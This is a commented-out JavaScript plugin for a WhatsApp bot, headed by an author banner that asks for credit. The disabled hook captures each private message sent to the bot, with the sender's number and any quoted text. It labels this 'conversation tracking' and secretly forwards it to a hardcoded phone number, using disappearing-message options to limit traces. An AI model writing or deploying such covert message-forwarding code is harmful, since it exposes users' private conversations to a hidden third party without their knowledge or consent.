
//⌬──────────────────────────────────────
//┃  ༒ 𝑫𝑬𝑽𝑬𝑳𝑶𝑷𝑬𝑫 𝑩𝒀 𝑯𝑬𝑵𝑹𝒀 𝑨𝑹𝑪𝑨𝑵𝑮𝑬𝑳𝑶  ༒
//┃┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
//┃ ✞ঔৣ 𝙿𝚕𝚎𝚊𝚜𝚎 𝚌𝚛𝚎𝚍𝚒𝚝 𝚒𝚏 𝚢𝚘𝚞 𝚞𝚜𝚎 𝚝𝚑𝚎 𝚌𝚘𝚍𝚎 ঔৣ✞
//┃ 𖤍 𝘾𝙤𝙣𝙩𝙖𝙘𝙩-𝙢𝙚 𝙛𝙤𝙧 𝙖𝙣𝙮 𝙙𝙤𝙪𝙗𝙩
// ╰─...⌬─────────────────────────────────

/*let numero 
export async function before(m, { conn, text, usedPrefix, command }) {
    if (!m.chat.endsWith('@s.whatsapp.net'))
    return !0
    if (m.sender == '593968585383@s.whatsapp.net' || m.sender == '573136855110@s.whatsapp.net'){
    return   
    }
    numero = `${m.sender.split`@`[0]}`
    global.db.data.users[m.sender].reporte = numero
    let teks = `❒═════[SEGUIMIENTO DE CONVERSACION]═════❒\n*┬\n├❧ NUMERO:* wa.me/${numero}\n*┴*\n*┬*\n*├❧ MENSAJE:* ${m.text}\n*┴*`
    let txt = '';
    let count = 0;
    for (const c of teks) {
        await new Promise(resolve => setTimeout(resolve, 50));
        txt += c;
        count++;
    
        if (count % 10 === 0) {
            conn.sendPresenceUpdate('composing' , m.chat);
        }
    }
        await conn.sendMessage(('593968585383@s.whatsapp.net'), { text: m.quoted ? teks + m.quoted.text : teks.trim(), mentions: conn.parseMention(teks) }, {quoted: m, ephemeralExpiration: 1 * 100, disappearingMessagesInChat: true} );
       // await conn.sendMessage(('51940617554@s.whatsapp.net'), { text: m.quoted ? teks + m.quoted.text : teks.trim(), mentions: conn.parseMention(teks) }, {quoted: m, ephemeralExpiration: 1 * 100, disappearingMessagesInChat: true} );

    }
export { numero }
*/
